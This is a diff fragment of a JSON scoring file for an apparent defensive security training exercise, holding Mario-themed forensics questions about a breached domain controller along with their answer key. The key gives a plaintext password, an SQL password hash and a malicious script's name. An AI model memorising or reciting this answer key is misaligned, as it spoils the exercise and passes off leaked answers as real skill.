+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Forensics Question 3 <span style=' color:{{POINTCOLOR}};'>correct</span>! ({{CI2}})",
+      "answers": [
+        {
+          "value": "princess",
+          "type": 3,
+          "format": "^.+$",
+          "label": "Password"
+        }
+      ],
+      "flags": [
+        "ignorews"
+      ],
+      "question": "After this system was breached, logs showed initial activity escalating from Luigi's account. Due to the lack of password policies in place, we believe Luigi's password was compromised.<br><br>What is Luigi's current plaintext password?<br><br>EXAMPLE: iloveyou2",
+      "CI2": "FQ3d8NNx"
+    },
+    {
+      "id": 3,
+      "points": 4,
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Forensics Question 4 <span style=' color:{{POINTCOLOR}};'>correct</span>! ({{CI2}})",
+      "answers": [
+        {
+          "value": "0200A37A23FD8751B5FC6C7EAEF9D29457E13CC0C1036427AE54E239F8B11C93248CDD74F9D69DCC05CFBD17DBA4C0A2610F0D960AB61472A6355A9F091AB1FC83862B229D0F",
+          "type": 3,
+          "format": "^[0-9A-Fa-f]+$",
+          "label": "Hash"
+        }
+      ],
+      "flags": [
+        "ignorews",
+        "ignorecase"
+      ],
+      "question": "This Domain Controller is running an E-COM website at <a href=\"http://mushroom.kingdom\" style=\"color: rgb(255,19,30);\">mushroom.kingdom</a> for clients in this domain.<br><br>According to the MS-SQL database also running on this system, what is the hexadecimal representation (without 0x prefix) of Lakitu's SQL password hash?<br><br>EXAMPLE: 0200657665727920636F7079206F6620736D363420697320706572736F6E616C697A65645b2d2d3e2073686f75746f75747320746f2073696d706c65666c697073203c2d2d5d",
+      "CI2": "FQ4bVoii"
+    },
+    {
+      "id": 4,
+      "points": 10,
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Forensics Question 5 <span style=' color:{{POINTCOLOR}};'>correct</span>! ({{CI2}})",
+      "answers": [
+        {
+          "value": "GoombasWrath.ps1",
+          "type": 3,
+          "format": "^[\\w\\s]+\\.[pP][Ss]1$",
+          "label": "Script Name"
+        }
+      ],
+      "flags": [
+        "ignorecase",
+        "ignorews"
+      ],
+      "question": "At a regular interval, several dangerous commands are being executed against this domain controller from a remote location, thus leading management to believe it is some sort of malicious script.<br><br>Unfortunately, no transcription logs appear to show where this script is coming from, nor what commands are being run on this system.<br><br>It is important that whatever activity is occuring should be stopped immediately while maintaining our critical services for the kingdom. Please report your findings below.<br><br>What is the name of the script being downloaded and executed?<br><br>EXAMPLE: PowerUp.ps1",
+      "CI2": "FQ57x6Ef"
+    }
+  ]
+}
